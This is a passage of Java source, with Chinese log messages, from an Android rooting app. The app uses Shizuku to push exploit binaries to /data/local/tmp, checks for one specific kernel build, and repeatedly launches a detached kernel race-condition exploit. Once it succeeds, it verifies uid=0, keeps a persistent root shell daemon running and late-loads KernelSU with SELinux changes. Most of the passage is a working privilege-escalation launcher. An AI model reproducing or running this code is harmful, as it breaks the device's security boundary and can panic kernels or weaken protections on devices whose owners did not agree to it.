                    if (!copyFile(new File(dir, n), new File(sd, n))) {
                        staged = false;
                        ui.log("[!] 暂存到外部目录失败: " + n, L_WARN);
                        break;
                    }
                }
                if (staged) {
                    StringBuilder cmd = new StringBuilder("mkdir -p " + TMP + "; ");
                    for (String n : ALL_FILES) {
                        cmd.append("cp -f '").append(sd.getAbsolutePath()).append("/").append(n)
                                .append("' ").append(TMP).append("/").append(n).append("; ");
                    }
                    cmd.append("chmod 755 ").append(TMP).append("/zt_run ").append(TMP).append("/zt_su; ");
                    cmd.append("chmod 644 ").append(TMP).append("/zt_fanout.zte ").append(TMP)
                            .append("/zt_su.zte ").append(TMP).append("/zt_cmds.txt; ");
                    for (String n : ALL_FILES) {
                        cmd.append("wc -c ").append(TMP).append("/").append(n).append("; ");
                    }
                    String out = sh(cmd.toString(), 180000);
                    ui.log("[i] cp 结果: " + out.replace("\n", " | "), L_NORM);
                    if (verifySizes(out, dir)) {
                        return true;
                    }
                    ui.log("[!] 外部目录方式校验不一致，改走管道", L_WARN);
                }
            }
        }
        StringBuilder err = new StringBuilder();
        for (int i = 0; i < ALL_FILES.length; i++) {
            File f = new File(dir, ALL_FILES[i]);
            if (!ShizukuShell.push(f, TMP + "/" + ALL_FILES[i], ALL_MODES[i], err)) {
                ui.log("[X] 写入失败: " + ALL_FILES[i] + " " + err, L_ERR);
                return false;
            }
        }
        String chk = sh("ls -l " + TMP + "/zt_run " + TMP + "/zt_su " + TMP + "/zt_cmds.txt 2>&1", 20000);
        return chk.contains("zt_cmds.txt");
    }

    // ---------------------------------------------------------------- main flow

    private void execute() {
        cancelled = false;
        String stamp = new java.text.SimpleDateFormat("MMdd-HHmm", java.util.Locale.US).format(new java.util.Date());
        runLog = TMP + "/zt-run-" + stamp + ".log";
        runLogMirror = "/sdcard/zt-run-" + stamp + ".log";
        ui.log("[i] 本次日志: " + runLog + " → 副本 " + runLogMirror, L_CMD);
        sh("for f in $(ls -t " + TMP + "/zt-run-*.log 2>/dev/null | tail -n +11); do rm -f \"$f\"; done", 20000);
        ui.stage("检查 Shizuku");
        if (!ShizukuShell.alive()) {
            ui.log("[X] Shizuku 未连接：先启动 Shizuku 服务（无线调试/root 启动均可）", L_ERR);
            ui.finished(false, "Shizuku 未运行");
            return;
        }
        int uid = ShizukuShell.serverUid();
        ui.log("[i] Shizuku v" + ShizukuShell.serverVersion() + " 服务 uid=" + uid, L_NORM);
        if (!ShizukuShell.hasPermission()) {
            ui.log("[X] 未授予本应用 Shizuku 权限（点『授权』）", L_ERR);
            ui.finished(false, "未授权");
            return;
        }
        if (uid == 0) {
            ui.log("[✓] Shizuku 以 root 运行：本应用已直接具备 uid=0，无需执行 exploit", L_OK);
            ui.finished(true, "已具备 root（Shizuku/root）");
            return;
        }
        String id = sh("id", 20000);
        ui.log("[i] shell 身份: " + id.replace("\n", " "), L_NORM);
        // 重启会把 /sdcard 上的副本截断在旧时刻，tmp 里的才是完整日志：开机后先补一份
        String sync = sh("cd " + TMP + " && n=0; for f in zt-run-*.log; do "
                + "[ -f \"$f\" ] && cat \"$f\" > /sdcard/\"$f\" 2>/dev/null && n=$((n+1)); done; echo SYNC=$n", 30000);
        if (sync.contains("SYNC=") && !sync.contains("SYNC=0")) {
            ui.log("[i] 已把 /data/local/tmp 的历史日志同步到 /sdcard（" + sync.replace("\n", " ") + "）", L_NORM);
        }
        String bootId = trim(sh("cat /proc/sys/kernel/random/boot_id 2>/dev/null", 15000));
        try {
            android.content.SharedPreferences sp = ctx.getSharedPreferences("zt", Context.MODE_PRIVATE);
            String lastBoot = sp.getString("boot_id", "");
            if (lastBoot.length() > 0 && bootId.length() > 0 && !lastBoot.equals(bootId)) {
                ui.log("[!] 设备在上次运行期间重启过（内核 panic）—— 那轮是崩溃，不是超时", L_WARN);
            }
            if (bootId.length() > 0) {
                sp.edit().putString("boot_id", bootId).apply();
            }
            int done = sp.getInt("attempts", 0);
            int wins = sp.getInt("wins", 0);
            if (done > 0) {
                ui.log("[i] 战绩：累计 " + done + " 轮，成功 " + wins + " 次"
                        + (wins > 0 ? "（平均 " + (done / Math.max(wins, 1)) + " 轮出一发）" : ""), L_NORM);
            }
        } catch (Throwable ignored) {
        }
        String krel = trim(sh("uname -r 2>/dev/null", 15000));
        String buildNo = "";
        java.util.regex.Matcher bm = java.util.regex.Pattern
                .compile("abogki([0-9]+)").matcher(krel);
        if (bm.find()) {
            buildNo = bm.group(1);
        }
        if (!buildNo.isEmpty() && !"543627741".equals(buildNo)) {
            ui.log("[✗] 内核 build 不匹配：你是 abogki" + buildNo + "，本载荷只支持 abogki543627741", L_ERR);
            ui.log("    强行运行会在跨缓存阶段直接 panic 并重启，不建议继续", L_ERR);
        } else if (!buildNo.isEmpty()) {
            ui.log("[✓] 内核 build 匹配（abogki" + buildNo + "）", L_OK);
        }
        String ksuMod = trim(sh("grep -c kernelsu /proc/modules 2>/dev/null", 15000));
        if (!"0".equals(ksuMod) && ksuMod.length() > 0) {
            ui.log("[!] 内核里还挂着 kernelsu 模块（上次 late-load 留下的）", L_ERR);
            ui.log("    它会 hook 系统调用、改变 slab 布局，这一轮基本不可能过", L_ERR);
            ui.log("    请先重启手机再跑，别在已经被 hook 的内核上开荒", L_WARN);
        } else {
            ui.log("[✓] 内核干净（无 kernelsu 模块残留）", L_OK);
        }
        selinuxBefore = trim(sh("getenforce 2>/dev/null", 15000));
        ui.log("[i] SELinux 当前: " + selinuxBefore + "（跑完后会再查一次，被改成 Permissive 会自动恢复）", L_NORM);
        if (!id.contains("uid=2000")) {
            ui.log("[!] 当前不是 shell(2000) 身份，流程仍会尝试继续", L_WARN);
        }

        if (resume) {
            ui.log("[i] 检测到上次未完成的运行，检查残留状态…", L_HDR);
            if (rootChannelAlive()) {
                ui.log("[✓] root 通道已存活，直接校验", L_OK);
                verifyAndFinish(false);
                return;
            }
            String pid = exploitPid();
            String logSize = trim(sh("stat -c %s " + runLog + " 2>/dev/null", 20000));
            if (pid.length() > 0) {
                ui.log("[✓] 上次的 exploit 仍在运行 pid=" + pid + "，接上监听（最多 2 分钟）", L_OK);
                int rr = pollResult(0, 120);
                if (rr == R_OK || rr == R_CHP) {
                    verifyAndFinish(rr == R_CHP);
                    return;
                }
                if (rr == R_ABORT) {
                    ui.finished(false, "IQBIND_ABORT");
                    return;
                }
                ui.log("[!] 上次的进程没有产出结果，结束后按新任务重跑", L_WARN);
                killExploit();
            } else if (logSize.length() > 0 && !"0".equals(logSize)) {
                ui.log("[i] 进程已结束，但 run.log 还有 " + logSize + " 字节，先读结果…", L_NORM);
                if (grepCount("ROOT_SHELL_READY") || grepCount("ROOT_CHILD_HOLD_PASS")) {
                    verifyAndFinish(grepCount("ROOT_CHILD_HOLD_PASS"));
                    return;
                }
                ui.log("[i] 日志里没有成功标记，按新任务重跑", L_NORM);
            } else {
                ui.log("[i] 没有残留进程、也没有 run.log，按新任务重跑", L_NORM);
            }
            resume = false;
        }

        if (hasSu()) {
            ui.log("[✓] 设备已有可用 su（uid=0），无需提权", L_OK);
            ui.finished(true, "设备已 root");
            return;
        }

        ui.stage("内核门禁");
        String k = sh("uname -r", 25000);
        ui.log("[i] 内核版本: " + k, L_NORM);
        if (!k.contains(KERNEL_EXPECT)) {
            ui.log("[X] 内核版本不匹配：实际 '" + k + "'，本包内核门禁=" + KERNEL_EXPECT, L_ERR);
            ui.log("    安全拒绝，未触碰内核。", L_WARN);
            ui.finished(false, "内核不匹配");
            return;
        }
        ui.log("[✓] 内核版本匹配", L_OK);

        File dir = preparePayload();
        if (dir == null) {
            ui.finished(false, "载荷校验失败");
            return;
        }
        ui.log("[✓] 载荷校验通过（4 个组件 sha256 一致）", L_OK);

        ui.stage("下发组件");
        if (!pushAll(dir)) {
            ui.finished(false, "组件下发失败");
            return;
        }
        ui.log("[✓] 组件已就位 " + TMP, L_OK);

        if (rootChannelAlive()) {
            ui.log("[✓] root 通道已存活（zt_su 守护在跑），跳过提权", L_OK);
            verifyAndFinish(false);
            return;
        }

        boolean success = false;
        boolean chpOnly = false;
        int pushFails = 0;
        for (int round = 1; round <= maxRounds && !cancelled && !success; round++) {
            ui.progress(round, maxRounds);
            ui.stage("第 " + round + "/" + maxRounds + " 轮");
            try {
                android.content.SharedPreferences sp2 = ctx.getSharedPreferences("zt", Context.MODE_PRIVATE);
                sp2.edit().putInt("attempts", sp2.getInt("attempts", 0) + 1).apply();
            } catch (Throwable ignored) {
            }
            if (!ShizukuShell.alive()) {
                ui.log("[X] Shizuku 连接已断开（设备可能重启了），请重新启动 Shizuku 再跑", L_ERR);
                ui.finished(false, "Shizuku 断开");
                return;
            }
            if (hasSu()) {
                success = true;
                break;
            }
            String boot = sh("getprop sys.boot_completed", 20000);
            if (!"1".equals(boot)) {
                if (boot.contains("ERROR") && !systemHealthy()) {
                    ui.log("[X] 系统已经不响应（" + boot + "）", L_ERR);
                    ui.log("    必须重启手机：现在起任何进程都会失败", L_ERR);
                    ui.finished(false, "系统已不稳定，必须重启");
                    return;
                }
                ui.log("  系统未就绪(boot_completed=" + boot + ")，下一轮", L_WARN);
                ShizukuShell.run(5000, "sleep 5");
                continue;
            }
            ShizukuShell.run(9000, "sleep 8");
            if (pref("kill_all", true)) {
                sh("am kill-all 2>/dev/null; true", 30000);
                ui.log("  [i] 已清后台，等 25 秒让内存回收/压缩跑完再开跑", L_NORM);
                ShizukuShell.run(28000, "sleep 25");
            }
            logLoad();
            if (pref("auto_screen_off", false)) {
                waitScreenOff(60);
            } else {
                ui.log("  [i] 保持亮屏运行（设置里可开启自动熄屏）", L_NORM);
            }

            try {
                writeCmds(dir);
            } catch (Exception e) {
                ui.log("[X] 生成命令文件失败: " + e, L_ERR);
                return;
            }
            if (!pushSmall(dir)) {
                ui.finished(false, "命令文件下发失败");
                return;
            }
            boolean needPush = !payloadsReady(dir);
            if (!needPush) {
                ui.log("  [i] 载荷已在设备上且大小一致，跳过推送", L_NORM);
            } else {
                sh("rm -f " + TMP + "/zt_fanout " + TMP + "/zt_su " + runLog, 30000);
                if (!pushAll(dir)) {
                    pushFails++;
                    if (pushFails >= 3) {
                        ui.log("[X] 连续 3 次下发失败：这是传输问题，不是 exploit 失败，重启无意义", L_ERR);
                        ui.log("    日志里看『[i] cp 结果』和『[X] 写入失败』定位", L_WARN);
                        ui.finished(false, "组件下发失败");
                        return;
                    }
                    ui.log("  下发失败（第 " + pushFails + " 次），下一轮", L_WARN);
                    continue;
                }
            }
            pushFails = 0;
            String chk = sh("cd " + TMP + " && ./zt_run --check", 40000);
            if (chk.contains("IQBIND_ABORT")) {
                ui.log("[X] 启动器执行失败:\n" + chk, L_ERR);
                ui.finished(false, "IQBIND_ABORT");
                return;
            }
            if (chk.length() > 0) {
                ui.log("  [check] " + chk.replace("\n", " | "), L_NORM);
            }
            ui.log("  启动 exploit（detached，App 挂了也会继续跑）…", L_NORM);
            if (!startExploitDetached()) {
                mirrorRunLog();
                killExploit();
                if (abortIfDirty()) {
                    return;
                }
                ui.log("  本轮失败，下一轮", L_WARN);
                continue;
            }
            int r = pollResult(round);
            if (r == R_OK) {
                success = true;
                break;
            }
            if (r == R_CHP) {
                success = true;
                chpOnly = true;
                break;
            }
            if (r == R_ABORT) {
                ui.finished(false, "IQBIND_ABORT");
                return;
            }
            if (r == R_DEAD && !ShizukuShell.alive()) {
                ui.log("[X] Shizuku 断开：设备大概率重启了", L_ERR);
                ui.log("    重开 Shizuku 后回来点『继续』即可接上", L_WARN);
                ui.finished(false, "设备重启 / Shizuku 断开");
                return;
            }
            if (r == R_TIMEOUT) {
                ui.log("  本轮超时（" + roundTimeout + "s）", L_WARN);
            } else if (r == R_HANG) {
                ui.log("  本轮判定卡死，已强制结束 zt_run（不用重启，直接下一轮）", L_WARN);
            } else if (r == R_DEAD) {
                ui.log("  exploit 进程已退出", L_WARN);
            }
            mirrorRunLog();
            killExploit();
            if (abortIfDirty()) {
                return;
            }
            ShizukuShell.run(2500, "sleep 2");
        }

        if (!success) {
            ui.log("[X] 已跑满 " + maxRounds + " 轮仍未成功", L_ERR);
            ui.log("    该 CVE 的竞态脏胜有概率静默重启，建议重启手机、重开 Shizuku 后重跑。", L_WARN);
            ui.finished(false, "提权失败");
            return;
        }
        verifyAndFinish(chpOnly);
    }

    /**
     * 有些管理器 APK 是 extractNativeLibs=false，so 不解压到 /data/app/.../lib。
     * 这里把它的 base.apk 拷进私有目录，用 Java 从 zip 里抠出 ksud，再下发到 /data/local/tmp/ksud。
     */
    private String prepareKsud(String preferPkg) {
        try {
            java.io.File prep = new java.io.File(ctx.getFilesDir(), "ksud_prep.sh");
            java.io.InputStream pin = ctx.getAssets().open("ksud_prep.sh");
            java.io.FileOutputStream pout = new java.io.FileOutputStream(prep);
            byte[] pbuf = new byte[8192];
            int pn;
            while ((pn = pin.read(pbuf)) > 0) {
                pout.write(pbuf, 0, pn);
            }
            pout.close();
            pin.close();
            StringBuilder perr0 = new StringBuilder();
            if (!ShizukuShell.push(prep, TMP + "/ksud_prep.sh", 0755, perr0)) {
                ui.log("[!] ksud_prep.sh 下发失败: " + perr0, L_WARN);
                return "";
            }
            int uid = android.os.Process.myUid();
            String[] pkgs = preferPkg != null && preferPkg.length() > 0
                    ? new String[]{preferPkg, "me.weishu.kernelsu", "com.resukisu.resukisu",
                    "com.sukisu.ultra", "me.yuki.fina", "com.rifsxd.ksunext"}
                    : new String[]{"me.weishu.kernelsu", "com.resukisu.resukisu",
                    "com.sukisu.ultra", "me.yuki.fina", "com.rifsxd.ksunext"};
            for (String pkg : pkgs) {
                java.io.File local = new java.io.File(ctx.getFilesDir(), "mgr.apk");
                if (local.exists()) {
                    local.delete();
                }
                String r = sh("printf 'sh " + TMP + "/ksud_prep.sh " + pkg + " "
                        + local.getAbsolutePath() + " " + uid + "\\nexit\\n' | " + TMP + "/zt_su", 90000);
                if (!r.contains("APK_OK")) {
                    continue;
                }
                if (!local.exists() || local.length() == 0) {
                    continue;
                }
                java.io.File ks = extractKsud(local);
                if (ks == null || ks.length() == 0) {
                    ui.log("[!] " + pkg + " 的 APK 里没找到 ksud", L_WARN);
                    continue;
                }
                StringBuilder perr = new StringBuilder();
                if (ShizukuShell.push(ks, TMP + "/ksud", 0755, perr)) {
                    sh("chmod 755 " + TMP + "/ksud 2>/dev/null; true", 15000);
                    return pkg + " -> " + TMP + "/ksud (" + ks.length() + "B)";
                }
            }
        } catch (Throwable t) {
            ui.log("[!] 解 ksud 出错: " + t, L_WARN);
        }
        return "";
    }

    private String apkPathOf(String pkg) {
        String p = trim(sh("pm path " + pkg + " 2>/dev/null | head -1 | sed 's/^package://'", 20000));
        if (p.length() == 0 || !p.contains("/")) {
            p = trim(sh("ls /data/app/*/" + pkg + "-*/base.apk 2>/dev/null | head -1", 20000));
        }
        return p;
    }

    private File extractKsud(File apk) {
        try {
            java.util.zip.ZipFile zf = new java.util.zip.ZipFile(apk);
            try {
                java.util.zip.ZipEntry best = zf.getEntry("lib/arm64-v8a/libksud.so");
                if (best == null) {
                    java.util.Enumeration<? extends java.util.zip.ZipEntry> en = zf.entries();
                    while (en.hasMoreElements()) {
                        java.util.zip.ZipEntry e = en.nextElement();
                        String n = e.getName();
                        if (!n.startsWith("lib/") || !n.endsWith(".so")) {
                            continue;
                        }
                        if (looksLikeKsud(zf, e)) {
                            best = e;
                            break;
                        }
                    }
                }
                if (best == null) {
                    return null;
                }
                File out = new File(ctx.getFilesDir(), "ksud.bin");
                java.io.InputStream in = zf.getInputStream(best);
                java.io.FileOutputStream fo = new java.io.FileOutputStream(out);
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) > 0) {
                    fo.write(buf, 0, n);
                }
                fo.close();
                in.close();
                return out;
            } finally {
                zf.close();
            }
        } catch (Throwable t) {
            return null;
        }
    }

    private boolean looksLikeKsud(java.util.zip.ZipFile zf, java.util.zip.ZipEntry e) {
        try {
            java.io.InputStream in = zf.getInputStream(e);
            byte[] head = new byte[4 * 1024 * 1024];
            int total = 0;
            while (total < head.length) {
                int n = in.read(head, total, head.length - total);
                if (n <= 0) {
                    break;
                }
                total += n;
            }
            in.close();
            String hay = new String(head, 0, Math.min(total, 1048576), "ISO-8859-1");
            return hay.contains("ksud::late_load") || hay.contains("kernelsu_patched_")
                    || hay.contains("ksud::metamodule");
        } catch (Throwable t) {
            return false;
        }
    }

    private void verifyAndFinish(boolean chpOnly) {
        ui.stage("root 校验");
        if (hasSu()) {
            String sid = sh("su -c id", 20000);
            for (String line : sid.split("\n")) {
                String t = line.trim();
                if (t.contains("uid=0")) {
                    ui.log("    " + t, L_NORM);
                    break;
                }
            }
            ui.log("[✓] 系统 su 可用（uid=0）", L_OK);
            ui.onRootReady();
            ui.finished(true, "提权成功（系统 su）");
            return;
        }
        // 一次性判定会误杀：zt_su 可能先打横幅，uid=0 在后面几行
        boolean rootOk = false;
        String lastRaw = "";
        for (int i = 0; i < 8 && !rootOk; i++) {
            lastRaw = runAsRoot("id");
            for (String line : lastRaw.split("\n")) {
                String s = line.trim();
                if (s.contains("uid=0")) {
                    ui.log("    " + s, L_OK);
                    rootOk = true;
                }
            }
            if (rootOk) {
                break;
            }
            ui.log("    [第 " + (i + 1) + " 次] " + (lastRaw.length() > 0
                    ? lastRaw.replace("\n", " | ") : "(无输出)"), L_CMD);
            if (i == 0) {
                ui.log("    root 会话可能还在起，4 秒后重试（最多 8 次）…", L_WARN);
            }
            ShizukuShell.run(6000, "sleep 4");
        }
        if (!rootOk) {
            ui.log("[X] root 通道验证失败（8 次都没拿到 uid=0）", L_ERR);
            ui.log("    守护进程: " + trim(sh("ps -A -o PID,NAME 2>/dev/null | grep -i zt_ | head -5", 20000)), L_CMD);
            ui.log("    zt_su 文件: " + trim(sh("ls -l " + TMP + "/zt_su 2>&1", 15000)), L_CMD);
            if (chpOnly) {
                ui.log("    exploit 已拿到 root，但 zt_su 守护没自动起来。", L_WARN);
                ui.log("    手动: printf 'id\\nexit\\n' | " + TMP + "/zt_su", L_WARN);
            }
            ui.finished(false, "root 校验失败");
            return;
        }
        ui.log("[✓] uid=0 已确认", L_OK);

        if (!hasSu()) {
            ui.stage("KernelSU late-load");
            File ksu = new File(new File(ctx.getFilesDir(), "payload"), "zt_ksu.sh");
            StringBuilder err = new StringBuilder();
            String preferPkg = "";
            try {
                preferPkg = ctx.getSharedPreferences("zt", Context.MODE_PRIVATE)
                        .getString("manager_pkg", "");
            } catch (Throwable ignored) {
            }
            String prepared = prepareKsud(preferPkg);
            if (prepared.length() > 0) {
                ui.log("[i] 已从管理器 APK 里解出 ksud 并下发: " + prepared, L_NORM);
            }
            if (ShizukuShell.push(ksu, TMP + "/zt_ksu.sh", 0755, err)) {
                ui.log("[i] 以 root 身份激活 KernelSU（late-load --kmi + SELinux 修复 + 拉起管理器）…", L_NORM);
                String prefer = "";
                try {
                    prefer = ctx.getSharedPreferences("zt", Context.MODE_PRIVATE)
                            .getString("manager_pkg", "");
                } catch (Throwable ignored) {
                }
                String r = sh("export PATH=/sbin:/system/bin:/system/xbin; printf 'sh " + TMP
                        + "/zt_ksu.sh " + prefer + "\\nexit\\n' | " + TMP + "/zt_su", 240000);
                for (String line : r.split("\n")) {
                    String s2 = line.trim();
                    if (s2.length() > 0 && !s2.contains("tty") && !s2.contains("job control")) {
                        ui.log("    " + s2, L_NORM);
                    }
                }
                String tail = sh("tail -n 10 " + TMP + "/zt_ksu.log 2>/dev/null", 20000);
                for (String line : tail.split("\n")) {
                    String s2 = line.trim();
                    if (s2.length() > 0) {
                        ui.log("    " + s2, L_NORM);
                    }
                }
                boolean suOk = false;
                for (int i = 0; i < 10; i++) {
                    if (hasSu()) {
                        suOk = true;
                        break;
                    }
                    ShizukuShell.run(2500, "sleep 2");
                }
                if (suOk) {
                    ui.log("[✓] KernelSU 已激活（新 shell 里 su 正常）", L_OK);
                } else if (tail.contains("KSU_MODULE=1")) {
                    ui.log("[!] 模块已加载，但新 shell 里 su 尚未生效（在管理器里点一次刷新/重开管理器）", L_WARN);
                } else if (tail.contains("LATE_LOAD_SKIP=1")) {
                    ui.log("[i] 未找到 libksud.so（不影响：zt_su 守护已提供 root）", L_NORM);
                } else {
                    ui.log("[i] late-load 未确认（不影响：zt_su 守护已提供 root）", L_NORM);
                }
                if (!suOk) {
                    String used = field(trim(sh("grep -m1 'pkg=' " + TMP + "/zt_ksu.log 2>/dev/null", 15000)), "pkg");
                    ui.log("[i] 本次 late-load 用的管理器: " + (used.length() > 0 ? used : "未识别"), L_NORM);
                    ui.log("    如果这个管理器打不开，去 设置 → 切换管理器 换成另一个，再重跑一次一键", L_WARN);
                    ui.log("    （zt_su 通道不受影响，root 依然可用）", L_NORM);
                }
            } else {
                ui.log("[i] zt_ksu.sh 下发失败，跳过 late-load（不影响 root 通道）", L_WARN);
            }
        } else {
            ui.log("[✓] KernelSU 已激活，跳过 late-load", L_OK);
        }

        ui.log("", L_NORM);
        ui.log("取 root: printf 'id\\nexit\\n' | " + TMP + "/zt_su", L_OK);
        ui.log("su 守护 lifetime = until_reboot，重启后重跑一次即可", L_NORM);
        ui.onRootReady();
        ui.finished(true, "提权成功");
    }
}
